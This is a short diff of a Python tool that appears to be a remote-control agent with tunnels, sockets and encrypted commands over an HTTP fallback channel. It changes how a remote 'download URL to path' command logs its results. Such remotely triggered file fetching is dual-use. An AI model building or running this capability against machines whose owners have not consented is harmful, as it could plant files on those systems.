@@ -856,7 +856,7 @@ class ConsoleThread(threading.Thread):
         super().__init__()
 
     def run(self):
-        global _controlc_count, _run, _connection_monitor_threads, _socket_threads, _tunnels, _selected_socket, macros
+        global _controlc_count, _run, _connection_monitor_threads, _socket_threads, _tunnels, _selected_socket, macros, _reply_timeout
 
         commands = deque()
 
@@ -1237,14 +1237,13 @@ def webCommandParserCallback(enc_keys, command):
         url = command['url']
         output_path = command['path']
         if url.startswith('http://') or url.startswith('https://'):
+            log(f"Downloading file from {url}")
             response = requests.get(url)
             with open(output_path, 'wb') as file:
                 file.write(response.content)
-            print(f"File downloaded successfully from {url}")
-            set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), enc_keys, -1, f"File downloaded successfully from {url}")
+            log(f"File downloaded successfully from {url}")
         else:
-            print("Invalid URL. Please provide a valid HTTP or HTTPS URL.")
-            set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), enc_keys, -1, "Invalid URL. Please provide a valid HTTP or HTTPS URL.") 
+            log("Invalid URL. Please provide a valid HTTP or HTTPS URL.") 
 
 # Define a signal handler for SIGINT (Control+C)
 def signal_handler(sig, frame):
